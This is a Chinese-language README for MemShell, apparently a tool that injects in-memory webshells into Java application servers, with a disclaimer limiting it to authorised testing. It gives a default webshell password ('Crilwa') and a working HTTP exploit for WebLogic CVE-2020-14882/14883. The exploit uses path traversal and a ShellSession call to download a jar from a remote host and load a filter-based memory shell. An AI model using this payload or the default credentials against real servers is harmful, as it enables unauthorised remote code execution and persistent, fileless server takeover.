# MemShell
## 免责声明

本工具旨在帮助企业快速定位漏洞修复漏洞,仅限授权安全测试使用!
严格遵守《中华人民共和国网络安全法》,禁止未授权非法攻击站点!

## 使用场景

冰蝎和蚁剑默认密码`Crilwa`

1. 代码执行，例如可以调用`URLClassLoader`远程加载类，便可以无文件落地注入内存马。
2. JavaAgent注入（需要文件落地） //TODO

### CVE-2020-14882&CVE-2020-14883

例如下面的payload，可以进行代码执行，加载远程恶意代码。

```http
GET /console/css/%25%32%65%25%32%65%25%32%66consolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.net.URLClassLoader u = new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL("http://192.168.220.1:8000/MemShell-1.0-SNAPSHOT.jar")});u.loadClass("Inject.WeblogicInjectFilterShell").newInstance(); u.close();"); HTTP/1.1
```

![](images\B5RFR1$H]VU@5{(@)]8}30B.png)

![image-20230301151252935](images/image-20230301151252935.png)

